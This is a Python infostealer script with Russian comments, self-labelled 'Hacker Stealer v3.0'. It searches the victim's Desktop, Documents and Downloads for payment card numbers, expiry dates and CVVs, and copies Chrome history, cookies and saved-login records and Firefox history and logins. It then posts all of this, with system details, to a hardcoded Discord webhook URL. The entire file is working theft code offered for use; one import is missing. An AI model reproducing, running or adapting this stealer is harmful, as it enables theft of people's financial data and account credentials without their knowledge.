import os
import sqlite3
import json
import requests
import shutil
import time
from pathlib import Path
from datetime import datetime
import platform
import psutil
import getpass

# Твой вебхук для Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/1379390920327434250/xKcKMz26fLZ2upjUNJsfDJ9N4_ldY5IKajZK_pw_UBKAnjHIq-slNPxR1m-giHGgglWP"

def send_to_discord(data):
    # Форматируем данные в красивый Embed
    embed = {
        "title": "🕵️‍♂️ Новый Взлом! 🕵️‍♂️",
        "color": 0xFF0000,  # Красный цвет
        "fields": [],
        "timestamp": datetime.now().isoformat(),
        "footer": {"text": "Hacker Stealer v3.0"}
    }

    # Добавляем данные в поля
    for key, value in data.items():
        if isinstance(value, list):
            value = "\n".join([str(v) for v in value])[:1000]  # Ограничиваем длину
        embed["fields"].append({"name": key, "value": f"`{value}`", "inline": True})

    payload = {"embeds": [embed]}
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print("Данные отправлены на Discord! 😈")
        else:
            print("Не смог отправить данные на вебхук!")
    except Exception as e:
        print(f"Ошибка отправки: {e}")

def search_files_for_cards():
    card_pattern = r"\b\d{4}[ -]?\d{4}[ -]?\d{4}[ -]?\d{4}\b"  # Номер карты
    expiry_pattern = r"\b(0[1-9]|1[0-2])\/?([2-9][0-9])\b"  # Срок действия
    cvv_pattern = r"\b\d{3}\b"  # CVV
    name_pattern = r"\b[A-Z]{2,}\s[A-Z]{2,}\b"  # Имя владельца

    user_dir = Path.home()
    search_dirs = [user_dir / "Desktop", user_dir / "Documents", user_dir / "Downloads"]
    found_cards = []

    for directory in search_dirs:
        print(f"Сканирую папку: {directory}")
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.endswith((".txt", ".doc", ".docx")):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, "r", encoding="utf-8") as f:
                                content = f.read()
                                card_numbers = re.findall(card_pattern, content)
                                expiries = re.findall(expiry_pattern, content)
                                cvvs = re.findall(cvv_pattern, content)
                                names = re.findall(name_pattern, content)

                                if card_numbers:
                                    card_data = {"number": card_numbers[0], "source": f"Файл {file_path}"}
                                    if expiries:
                                        card_data["expiry"] = expiries[0][0] + "/" + expiries[0][1]
                                    if cvvs:
                                        card_data["cvv"] = cvvs[0]
                                    if names:
                                        card_data["holder"] = names[0]
                                    found_cards.append(str(card_data))
                        except Exception as e:
                            print(f"Не смог прочитать файл {file_path}: {e}")
        except Exception as e:
            print(f"Ошибка при сканировании папки {directory}: {e}")

    return found_cards

def get_chrome_data():
    user_dir = Path.home()
    chrome_path = user_dir / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default"
    data = {"history": [], "cookies": [], "passwords": []}

    # История
    history_path = chrome_path / "History"
    if history_path.exists():
        try:
            temp_db = "chrome_history_copy.db"
            shutil.copy(history_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls LIMIT 10")
            data["history"] = [{"url": row[0], "title": row[1]} for row in cursor.fetchall()]
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Ошибка при получении истории Chrome: {e}")

    # Куки
    cookies_path = chrome_path / "Cookies"
    if cookies_path.exists():
        try:
            temp_db = "chrome_cookies_copy.db"
            shutil.copy(cookies_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 10")
            data["cookies"] = [{"host": row[0], "name": row[1]} for row in cursor.fetchall()]
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Ошибка при получении куки Chrome: {e}")

    # Пароли
    passwords_path = chrome_path / "Login Data"
    if passwords_path.exists():
        try:
            temp_db = "chrome_logins_copy.db"
            shutil.copy(passwords_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value FROM logins LIMIT 10")
            data["passwords"] = [{"url": row[0], "username": row[1]} for row in cursor.fetchall()]
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Ошибка при получении паролей Chrome: {e}")

    return data

def get_firefox_data():
    user_dir = Path.home()
    firefox_path = user_dir / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"
    data = {"history": [], "passwords": []}

    if firefox_path.exists():
        try:
            for profile in firefox_path.glob("*"):
                places_file = profile / "places.sqlite"
                if places_file.exists():
                    temp_db = "firefox_places_copy.db"
                    shutil.copy(places_file, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title FROM moz_places LIMIT 10")
                    data["history"] = [{"url": row[0], "title": row[1]} for row in cursor.fetchall()]
                    conn.close()
                    os.remove(temp_db)

                logins_file = profile / "logins.json"
                if logins_file.exists():
                    with open(logins_file, "r", encoding="utf-8") as f:
                        logins_data = json.load(f)
                        data["passwords"] = [{"url": login["hostname"], "username": login["username"]} for login in logins_data.get("logins", [])[:10]]
        except Exception as e:
            print(f"Ошибка при получении данных Firefox: {e}")

    return data

def get_system_info():
    return {
        "OS": platform.system() + " " + platform.release(),
        "Username": getpass.getuser(),
        "CPU": platform.processor(),
        "RAM": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
        "Disk Usage": f"{psutil.disk_usage('/').percent}%"
    }

def main():
    print("Запуск скрипта 'Ультра Сборщик Данных'... 😎")

    # Собираем данные
    data = {}
    data["Системная информация"] = get_system_info()
    data["Карты"] = search_files_for_cards()
    data["Chrome Данные"] = get_chrome_data()
    data["Firefox Данные"] = get_firefox_data()

    # Отправляем
    send_to_discord(data)

if __name__ == "__main__":
    main()